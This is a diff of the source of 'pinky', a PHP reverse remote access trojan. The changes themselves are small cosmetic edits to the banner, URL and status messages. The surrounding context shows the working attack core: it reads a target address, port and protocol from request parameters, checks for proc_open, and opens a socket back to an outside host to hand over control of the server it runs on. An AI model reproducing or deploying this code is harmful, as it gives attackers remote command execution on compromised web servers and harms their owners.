@@ -3,9 +3,14 @@ set_time_limit ( 0 );
 
 $version = "0.1";
 $author = "David Tavarez (davidtavarez)";
-$url = "https://github.com/davidtavarez/pinky";
+$url = "https://davidtavarez.github.io/pinky/";
 
+if (PHP_SAPI === 'cli' || empty ( $_SERVER ['REMOTE_ADDR'] )) {
+	echo chr(27).chr(91).'H'.chr(27).chr(91).'J';
+}
 echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
+echo $author . "\n";
+echo $url . "\n";
 
 $bin = PHP_BINDIR;
 $path = realpath ( NULL ) . '/';
@@ -44,7 +49,7 @@ if (PHP_SAPI === 'cli' || empty ( $_SERVER ['REMOTE_ADDR'] )) {
 	$type = isset ( $_GET ['t'] ) ? $_GET ['t'] : 'tcp';
 }
 
-echo "\nChecking if function  \e[1mproc_open\e[0m is available... ";
+echo "\nChecking if function \e[1mproc_open\e[0m is available... ";
 
 if (function_exists ( 'proc_open' )) {
 	echo "Ok.\n";
@@ -52,10 +57,10 @@ if (function_exists ( 'proc_open' )) {
 	exit ( "Failed." );
 }
 
-echo "Trying to connect with server... ";
+echo "Trying to open connection with the server... ";
 $session = @stream_socket_client ( $type . '://' . $address . ':' . $port, $errno, $errstr, 30 );
 if (! $session) {
-	exit ( "ERROR: " . $errstr . "(" . $errno . ")\n" );
+	exit ( "ERROR: " . $errstr . "\n\n" );
 } else {
 	echo "Connection stablished with \e[1m" . $type . "\e[0m://\e[1m" . $address . "\e[0m:\e[1m" . $port . "\e[0m/\n";
 	// Send client information.
